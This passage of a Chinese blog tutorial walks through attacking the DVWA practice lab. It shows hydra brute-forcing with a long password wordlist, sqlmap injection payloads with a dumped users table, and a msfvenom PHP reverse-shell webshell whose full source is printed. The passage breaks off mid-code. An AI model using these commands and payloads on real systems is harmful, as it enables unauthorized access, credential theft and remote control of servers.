-&lt;li&gt;-l + 用户名 : 这个是设置需要破解的用户名，我们尝试admin&lt;/li&gt;
-&lt;li&gt;-P 密码字典 : 指定一个txt文件，里面都是依次猜测需要的密码&lt;/li&gt;
-&lt;li&gt;-V : 显示详细过程&lt;/li&gt;
-&lt;li&gt;-n es : 尝试空口令登录&lt;/li&gt;
-&lt;li&gt;IP地址 : 也就是目标的地址咯，上面的&lt;code&gt;192.168.0.4&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;http-post-form : 指定爆破类型，后面还要加爆破的页面地址，这里是http的post页面 没有密码字典？我这里提供一个，你自己复制进一个txt文件里就可以了。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;pre&gt;&lt;code&gt;123456
-12345
-123456789
-Password
-iloveyou
-princess
-rockyou
-1234567
-12345678
-abc123
-admin888
-admin123
-test
-password
-123456
-a123456
-123456a
-5201314
-111111
-woaini1314
-qq123456
-123123
-0
-1qaz2wsx
-1q2w3e4r
-qwe123
-7758521
-123qwe
-a123123
-123456aa
-woaini520        
-woaini
-100200
-1314520
-woaini123
-123321
-q123456
-123456789
-123456789a
-5211314
-asd123
-a123456789
-z123456
-asd123456
-a5201314
-aa123456
-zhang123
-aptx4869
-123123a
-1q2w3e4r5t
-1qazxsw2
-5201314a
-1q2w3e
-aini1314
-31415926
-q1w2e3r4
-123456qq
-woaini521
-1234qwer
-a111111
-520520
-iloveyou
-abc123 
-110110
-111111a          
-123456abc        
-w123456
-7758258
-123qweasd
-159753
-qwer1234
-a000000
-qq123123
-zxc123
-123654
-abc123456
-123456q
-qq5201314
-12345678
-000000a          
-456852
-as123456
-1314521          
-112233
-521521
-qazwsx123
-zxc123456
-abcd1234
-asdasd
-666666
-love1314
-QAZ123
-aaa123
-q1w2e3
-aaaaaa
-a123321
-123000
-11111111
-12qwaszx
-5845201314
-s123456
-nihao123
-caonima123
-zxcvbnm123
-wang123
-159357
-1A2B3C4D
-asdasd123
-584520
-753951
-147258
-1123581321
-110120
-qq1314520        
-123456.com
-123123
-idc123!@#
-123
-aaa123!@#
-qq123.com
-123456
-wantian##*(
-qwe123
-qwe1234
-123qwe
-123qwer
-1qaz2wsx
-1qaz
-159753
-!Q@W#E
-159357
-147369
-1234567
-password
-aistar123&amp;lt;&amp;gt;!N
-321
-idcji2010
-qqqqqq
-1q2w3e
-q1w2e3
-336699
-abc123
-asd123
-123654
-1
-111111
-111
-111qqq...
-123456
-953139.
-0258
-111qqq!!!
-1236
-qqii
-tyinfo
-abcd36888
-rst_login
-OAOidc
-OAOidc123!@#
-OAOidc123
-esin888
-qwer
-power123
-power.liu
-power.yu
-dns99+588
-zhengui
-idc0.1
-7715123
-sdwer
-power.zhao
-sdwer123
-qwer1234
-esincs
-jspower123.0
-5656789
-2323456
-power.com
-power123.0
-power0.123
-jspower.com
-123123
-hlwj0519-1205.jf
-123321
-zaxscdvf
-..0
-!@#$QWER
-95313
-1231321
-321123
-vipnew
-idc0514
-1235698
-235689
-326598
-112233
-111222
-qqqqqq
-idc11
-21vianet
-#@!ewq
-1010
-111qqq
-1234%^&amp;amp;*
-12345^&amp;amp;*()
-123456
-4867086
-1234567
-123!@#
-123456!@#
-10000
-794613
-784512
-895623
-789456
-456123
-654321
-123!@#
-1234!@#$
-11185
-12345!@#$%
-qwe123!@#
-!@#123
-!@#321
-123#@!
-19861212
-19831212
-19841020
-#@!123
-#@!321
-idcidc
-12345^&amp;amp;*()
-!@#$%^&amp;amp;*()
-)(*&amp;amp;^%$#@!
-0987654321
-tyidc
-1122
-111222
-idc123
-idcidcok
-idcuser
-abcd1234
-1234abcd
-caonima
-1q2w3e4r
-888888
-admin!@#
-abc!@#
-!Q@W#E$R%T
-idc2010
-1236
-1q2w3e4r5t
-qqaazz
-asdasd
-admin
-admin1
-admin123
-aaa111
-111aaa
-123aaa
-lh222
-lhidc
-123a
-a123
-123456a
-a123456
-aaa123
-qazwsx
-qazxsw
-0123
-123112233
-123111
-www.7x24.cn
-shisp.net
-123000
-idc0123
-1230..
-123456789
-123456qwe
-123qwe
-12345qwert
-zxcvbnm
-qwerty
-qweqwe
-q1w2e3
-123ewq
-qwe321
-1qazxsw2
-12qwaszx
-1234rewq
-123456.com
-lituobestsanmao
-!@#19841010
-msfadmin
-19885510
-xyidc_2006
-95217189
-95217
-chinayixun
-huachen1258zz
-sanhe123
-3H8IDC!!#
-3H8IDC72sanhe000
-xiaoyili
-sanhe000~!@#  
-3H8IDC!!#
-ccfeng66131421  
-!@#59560955
-tkggja850518`1
-zhengui
-anada325!@#
-www.txwscx.comsritgyxf2sxy19831122zx
-ZHONGGUO$#@!999@
-admin13906271234
-395835961
-senlinyan
-3203672
-9527999!!!
-P@ssw0rd
-huaiyukeji115
-idc9aewr42
-idc0.1
-123asdasd
-qsx6059410172.
-idc0001
-idc800888
-idc46121
-123asdasd
-882627.8
-luofei520!@#123
-852799!!!
-idc0123.0
-513tyml.com
-abc123!@#
-1q2w3e,./? &amp;gt;&amp;lt;
-6504710shuazuan
-123.789+
-123asdasd
-752883855.
-senlinyan$
-admin001
-6695zx
-scictd9821622
-365obsserver!
-ranglm123456
-13920225257
-idc925111
-1qaz@wsx#edc
-.......199
-xu15817079919
-yanjin0429
-zhangznw
-13527380230
-idc0.01
-idc123&amp;amp;123
-662766
-122.224
-huaiyukeji115
-.......199@
-liuzhangzi1988
-123456!@#$%^
-idc0123
-dahouzi110
-123.789+
-trista188#**
-mm1237
-07736056123
-TnHoo15862380404
-idc0123
-189532210113
-idc123
-gedingfeng1102888
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;以及你需要把上面抓到的&lt;code&gt;username=admin&amp;amp;password=6666666666&amp;amp;Login=Login&lt;/code&gt;和&lt;code&gt;Login failed&lt;/code&gt;整合一下变成这样:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;username=^USER^&amp;amp;password=^PASS^&amp;amp;Login=Login:Login failed
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;整合一下，需要执行的指令就是下面这个了&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ hydra -l admin -P ./密码字典/pass-wake.txt -V -e ns 192.168.0.4 http-post-form &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/dvwa/login.php:username=^USER^&amp;amp;password=^PASS^&amp;amp;Login=Login:Login failed&amp;#34;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;它很快就会给你破解出来&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-10-20_07-49-15.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-10-20_07-50-18.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;由上图可看出，密码就是&lt;code&gt;password&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;接下来我们尝试登录&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-10-20_07-51-58.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;如果成功登录，出现了这个页面，那么恭喜你，第一关完美通过
-&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-10-20_07-54-11.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;第二关简单sql注入&#34;&gt;第二关|简单SQL注入&lt;/h3&gt;
-&lt;p&gt;第一关过了以后，我们要看看它的数据库里面有什么&lt;/p&gt;
-&lt;h4 id=&#34;抓包-1&#34;&gt;抓包&lt;/h4&gt;
-&lt;p&gt;我们回到他这个网页，先进入&lt;code&gt;DVWA Security&lt;/code&gt;，把安全等级改成&lt;code&gt;Low&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-11-03_13-11-42.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;再点击&lt;code&gt;SQL Injection&lt;/code&gt;这个按钮，进入这个页面。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-11-03_12-55-19.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;接下来打开burp，按照之前的操作一样，监听，抓包什么的（这里我上面写得很详细了）&lt;/p&gt;
-&lt;p&gt;在burpsuite的监听下，在这个输入框里随便输入一些内容，然后点击这个&lt;code&gt;Submit&lt;/code&gt;按钮，Burp就会自动抓包了&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-11-03_13-12-22.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;将它保存为一个txt文件，但是要记住它的位置，比如我的是&lt;code&gt;~/get.txt&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-11-03_12-58-29.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;这样抓包工作就完成了。&lt;/p&gt;
-&lt;h4 id=&#34;使用sqlmap注入&#34;&gt;使用sqlmap注入&lt;/h4&gt;
-&lt;p&gt;接下来用到的工具就是sqlmap了，这里只写出注入的流程，具体的教程请参考由帝的视频&lt;/p&gt;
-&lt;p&gt;我们先扫描一下注入点&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ sqlmap -r &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;get.txt&amp;#34;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-11-03_13-17-27.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-11-03_13-18-06.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;这里均选&lt;code&gt;y&lt;/code&gt;即可。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-11-03_13-18-59.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;最后一个选项选&lt;code&gt;n&lt;/code&gt;不必浪费时间了。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-11-03_13-19-51.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;接下来我们就获得我们需要的信息了，数据库版本什么的。我把它贴出来吧。&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;sqlmap identified the following injection point(s) with a total of 149 HTTP(s) requests:
----
-Parameter: id (GET)
-    Type: boolean-based blind
-    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
-    Payload: id=6666666&#39; OR NOT 1144=1144#&amp;amp;Submit=Submit
-
-    Type: error-based
-    Title: MySQL &amp;gt;= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
-    Payload: id=6666666&#39; OR ROW(6268,9799)&amp;gt;(SELECT COUNT(*),CONCAT(0x7162786b71,(SELECT (ELT(6268=6268,1))),0x716a767071,FLOOR(RAND(0)*2))x FROM (SELECT 9569 UNION SELECT 7660 UNION SELECT 7717 UNION SELECT 8645)a GROUP BY x)-- dPXL&amp;amp;Submit=Submit
-
-    Type: time-based blind
-    Title: MySQL &amp;gt;= 5.0.12 AND time-based blind (query SLEEP)
-    Payload: id=6666666&#39; AND (SELECT 4811 FROM (SELECT(SLEEP(5)))hDuM)-- SMOw&amp;amp;Submit=Submit
-
-    Type: UNION query
-    Title: MySQL UNION query (NULL) - 2 columns
-    Payload: id=6666666&#39; UNION ALL SELECT NULL,CONCAT(0x7162786b71,0x794f4b67535851624375466379624550476a6243584e4b754d7250524e524d7a6c70587370704877,0x716a767071)#&amp;amp;Submit=Submit
----
-[13:19:30] [INFO] the back-end DBMS is MySQL
-back-end DBMS: MySQL &amp;gt;= 4.1
-[13:19:30] [INFO] fetched data logged to text files under &#39;/home/weepingdogel/.sqlmap/output/192.168.0.105&#39;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;接下来我们就要查看数据库里面的内容了，由于原因，我就不贴出逐级查看的代码了，我直接dump&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ sqlmap -r &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;~/get.txt&amp;#34;&lt;/span&gt; --dump
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-11-03_13-26-48.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;出来了。&lt;/p&gt;
-&lt;p&gt;如果你终端里获取到了以下信息，那么说明，第二关通过了&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;Database: dvwa
-Table: users
-[5 entries]
-+---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+------------+
-| user_id | user    | avatar                                                | password                                    | last_name | first_name |
-+---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+------------+
-| 1       | admin   | http://172.16.123.129/dvwa/hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      |
-| 2       | gordonb | http://172.16.123.129/dvwa/hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123)   | Brown     | Gordon     |
-| 3       | 1337    | http://172.16.123.129/dvwa/hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       |
-| 4       | pablo   | http://172.16.123.129/dvwa/hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      |
-| 5       | smithy  | http://172.16.123.129/dvwa/hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        |
-+---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+------------+
-&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;第三关操作系统渗透&#34;&gt;第三关|操作系统渗透&lt;/h3&gt;
-&lt;p&gt;Well,&lt;/p&gt;
-&lt;p&gt;接下来我们就要进行最关键的一环了，我们将使用Webshell的方式入侵靶机的操作系统。&lt;/p&gt;
-&lt;p&gt;知道PHP吗？我对它了解也不是很多，总之它可以被上传到服务器然后以可执行文件的方式运行。&lt;/p&gt;
-&lt;p&gt;这次也将使用PHP文件作为&lt;strong&gt;木马&lt;/strong&gt;进行攻击。&lt;/p&gt;
-&lt;h4 id=&#34;生成木马&#34;&gt;生成木马&lt;/h4&gt;
-&lt;p&gt;我们用 &lt;strong&gt;&lt;code&gt;msfvenom&lt;/code&gt;&lt;/strong&gt; 这个命令来生成。执行&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ msfvenom -p php/meterpreter/reverse_tcp LHOST&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;192.168.0.106 LPORT&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4444&lt;/span&gt; -o test.php
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-11-03_13-35-25.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;这样就生成好了。来看看里面有什么？&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/*&amp;lt;?php /**/&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;error_reporting&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;); $ip &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;192.168.0.106&amp;#39;&lt;/span&gt;; $port &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4444&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (($f &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;stream_socket_client&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;is_callable&lt;/span&gt;($f)) { $s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $f(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tcp://&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;$ip&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;$port&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;); $s_type &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;stream&amp;#39;&lt;/span&gt;; } &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;$s &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; ($f &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;fsockopen&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;is_callable&lt;/span&gt;($f)) { $s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $f($ip, $port); $s_type &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;stream&amp;#39;&lt;/span&gt;; } &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;$s &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; ($f &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;socket_create&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;is_callable&lt;/span&gt;($f)) { $s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $f(&lt;span style=&#34;color:#a6e22e&#34;&gt;AF_INET&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;SOCK_STREAM&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;SOL_TCP&lt;/span&gt;); $res &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;@&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;socket_connect&lt;/span&gt;($s, $ip, $port); &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;$res) { &lt;span style=&#34;color:#66d9ef&#34;&gt;die&lt;/span&gt;(); } $s_type &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;socket&amp;#39;&lt;/span&gt;; } &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;$s_type) { &lt;span style=&#34;color:#66d9ef&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;no socket funcs&amp;#39;&lt;/span&gt;); } &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;$s) { &lt;span style=&#34;color:#66d9ef&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;no socket&amp;#39;&lt;/span&gt;); } &lt;span style=&#34;color:#66d9ef&#34;&gt;switch&lt;/span&gt; ($s_type) { &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;stream&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; $len &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fread&lt;/span&gt;($s, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;); &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;socket&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; $len &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;socket_read&lt;/span&gt;($s, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;); &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;; } &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;$len) { &lt;span style=&#34;color:#66d9ef&#34;&gt;die&lt;/span&gt;(); } $a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;unpack&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Nlen&amp;#34;&lt;/span&gt;, $len); $len &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $a[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;len&amp;#39;&lt;/span&gt;]; $b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;strlen&lt;/span&gt;($b) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; $len) { &lt;span style=&#34;color:#66d9ef&#34;&gt;switch&lt;/span&gt; ($s_type) { &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;stream&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; $b &lt;span style=&#34;color:#f92672&#34;&gt;.=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fread&lt;/span&gt;($s, $len&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;strlen&lt;/span&gt;($b)); &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;socket&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; $b &lt;span style=&#34;color:#f92672&#34;&gt;.=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;socket_read&lt;/span&gt;($s, $len&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;strlen&lt;/span&gt;($b)); &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;; } } $GLOBALS[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;msgsock&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $s; $GLOBALS[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;msgsock_type&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $s_type; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;extension_loaded&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;suhosin&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ini_get&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;suhosin.executor.disable_eval&amp;#39;&lt;/span&gt;)) { $suhosin_bypass&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;create_function&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;, $b); $suhosin_bypass(); } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; { &lt;span style=&#34;color:#66d9ef&#34;&gt;eval&lt;/span&gt;($b); } &lt;span style=&#34;color:#66d9ef&#34;&gt;die&lt;/span&gt;();
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;只有一行～！这一行就是嘿嘿。。。自己看啦&lt;/p&gt;
-&lt;p&gt;我们加一些html上去吧:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/*&amp;lt;?php /**/&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;error_reporting&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;); $ip &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;192.168.0.106&amp;#39;&lt;/span&gt;; $port &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4444&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (($f &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;stream_socket_client&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;is_callable&lt;/span&gt;($f)) { $s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $f(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tcp://&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;$ip&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;$port&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;); $s_type &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span 